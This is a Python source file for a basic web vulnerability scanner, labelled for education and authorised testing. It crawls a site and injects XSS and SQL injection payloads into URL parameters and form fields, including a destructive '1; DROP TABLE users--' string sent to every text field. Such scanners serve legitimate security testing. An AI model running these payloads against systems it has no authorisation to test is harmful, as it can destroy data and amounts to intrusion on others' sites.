import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from datetime import datetime

XSS_PAYLOADS = [
    "<script>alert('xss')</script>",
    "<img src=x onerror=alert(1)>",
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
]
SQLI_PAYLOADS = [
    "'",
    "1' OR '1'='1",
    "' OR 1=1--",
    "1; DROP TABLE users--",
]
SQLI_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "mysql_fetch",
    "ora-01756",
    "microsoft ole db",
    "sqlite3::",
    "postgresql",
    "pg_query",
]
def get_all_forms(url, session):
    """Find all forms on a page and return them as a list"""
    try:
        response = session.get(url, timeout=5)
        soup = BeautifulSoup(response.text, "html.parser")
        return soup.find_all("form")
    except requests.RequestException:
        return []


def get_form_details(form):
    """
    Extract useful info from a form element.
    Returns a dict with action, method, and list of inputs.
    """
    details = {}
    details["action"] = form.attrs.get("action", "")
    details["method"] = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all(["input", "textarea", "select"]):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        input_value = input_tag.attrs.get("value", "test")

        if input_name:  
            inputs.append({
                "type": input_type,
                "name": input_name,
                "value": input_value
            })

    details["inputs"] = inputs
    return details

def submit_form(form_details, base_url, payload, session):
    """
    Submit a form with a payload injected into every text field.
    Returns the response.
    """
    target_url = urljoin(base_url, form_details["action"])

    data = {}
    for input_field in form_details["inputs"]:
        if input_field["type"] in ("text", "search", "email", "password", "textarea"):
            data[input_field["name"]] = payload 
        else:
            data[input_field["name"]] = input_field["value"] 

    try:
        if form_details["method"] == "post":
            return session.post(target_url, data=data, timeout=5)
        else:
            return session.get(target_url, params=data, timeout=5)
    except requests.RequestException:
        return None
    
def check_xss_in_url(url, session):
    """Test XSS by injecting payloads into URL parameters"""
    findings = []
    parsed = urlparse(url)
    if not parsed.query:
        return findings   

    for payload in XSS_PAYLOADS:
        test_url = url
        try:
            response = session.get(test_url + payload, timeout=5)
            if payload in response.text:
                findings.append({
                    "type": "XSS",
                    "url": test_url,
                    "payload": payload,
                    "method": "URL parameter"
                })
                break 
        except requests.RequestException:
            continue

    return findings

def check_xss_in_forms(url, session):
    """Test XSS by injecting payloads into form fields"""
    findings = []
    forms = get_all_forms(url, session)

    for form in forms:
        form_details = get_form_details(form)

        for payload in XSS_PAYLOADS:
            response = submit_form(form_details, url, payload, session)
            if response and payload in response.text:
                findings.append({
                    "type": "XSS",
                    "url": url,
                    "payload": payload,
                    "method": f"Form ({form_details['method'].upper()})"
                })
                break

    return findings


def check_sqli_in_url(url, session):
    """Test SQLi by injecting payloads into URL parameters"""
    findings = []

    parsed = urlparse(url)
    if not parsed.query:
        return findings

    for payload in SQLI_PAYLOADS:
        try:
            response = session.get(url + payload, timeout=5)

            response_lower = response.text.lower()
            for error in SQLI_ERRORS:
                if error in response_lower:
                    findings.append({
                        "type": "SQLi",
                        "url": url,
                        "payload": payload,
                        "method": "URL parameter",
                        "error_found": error
                    })
                    break

        except requests.RequestException:
            continue

    return findings


def check_sqli_in_forms(url, session):
    """Test SQLi by injecting payloads into form fields"""
    findings = []
    forms = get_all_forms(url, session)

    for form in forms:
        form_details = get_form_details(form)

        for payload in SQLI_PAYLOADS:
            response = submit_form(form_details, url, payload, session)
            if response:
                response_lower = response.text.lower()
                for error in SQLI_ERRORS:
                    if error in response_lower:
                        findings.append({
                            "type": "SQLi",
                            "url": url,
                            "payload": payload,
                            "method": f"Form ({form_details['method'].upper()})",
                            "error_found": error
                        })
                        break

    return findings

def crawl(base_url, session, max_urls=20):
    """
    Find all links on the target site that belong to the same domain.
    Returns a list of URLs to scan.
    """
    visited = set()
    to_visit = [base_url]
    found_urls = []

    base_domain = urlparse(base_url).netloc 

    while to_visit and len(found_urls) < max_urls:
        url = to_visit.pop(0)

        if url in visited:
            continue

        visited.add(url)

        try:
            response = session.get(url, timeout=5)
            found_urls.append(url)

            soup = BeautifulSoup(response.text, "html.parser")

            for link in soup.find_all("a", href=True):
                full_url = urljoin(url, link["href"])

                if urlparse(full_url).netloc == base_domain:
                    if full_url not in visited:
                        to_visit.append(full_url)

        except requests.RequestException:
            continue

    return found_urls

print("=" * 60)
print("        WEB VULNERABILITY SCANNER")
print("        Educational use and authorised testing only")
print("=" * 60)

target = input("\nEnter target URL (e.g. http://localhost:3000): ").strip()
if not target.startswith("http"):
    target = "http://" + target

session = requests.Session()
session.headers["User-Agent"] = "Mozilla/5.0 (Security Scanner — Educational)"

print(f"\n[*] Starting scan of: {target}")
print(f"[*] Time: {datetime.now().strftime('%H:%M:%S')}")
print(f"\n[*] Crawling for pages to test...")

urls = crawl(target, session, max_urls=20)
print(f"[*] Found {len(urls)} pages to test\n")
print("-" * 60)

all_findings = []

for url in urls:
    print(f"[*] Testing: {url}")

    findings = []
    findings += check_xss_in_url(url, session)
    findings += check_xss_in_forms(url, session)
    findings += check_sqli_in_url(url, session)
    findings += check_sqli_in_forms(url, session)

    if findings:
        for f in findings:
            if f["type"] == "XSS":
                print(f"  [!!] XSS FOUND via {f['method']}")
                print(f"       Payload: {f['payload']}")
            elif f["type"] == "SQLi":
                print(f"  [!!] SQLi FOUND via {f['method']}")
                print(f"       Payload: {f['payload']}")
                print(f"       Error:   {f['error_found']}")
        all_findings += findings
    else:
        print(f"  [-] No issues found")

xss_count  = sum(1 for f in all_findings if f["type"] == "XSS")
sqli_count = sum(1 for f in all_findings if f["type"] == "SQLi")

print("\n" + "=" * 60)
print("SCAN COMPLETE")
print(f"Pages tested         : {len(urls)}")
print(f"XSS vulnerabilities  : {xss_count}")
print(f"SQLi vulnerabilities : {sqli_count}")
print(f"Total findings       : {len(all_findings)}")
print("=" * 60)

if all_findings:
    print("\nFINDINGS SUMMARY")
    print("-" * 60)
    for i, f in enumerate(all_findings, 1):
        print(f"{i}. [{f['type']}] {f['url']}")
        print(f"   Method : {f['method']}")
        print(f"   Payload: {f['payload']}")
        print()




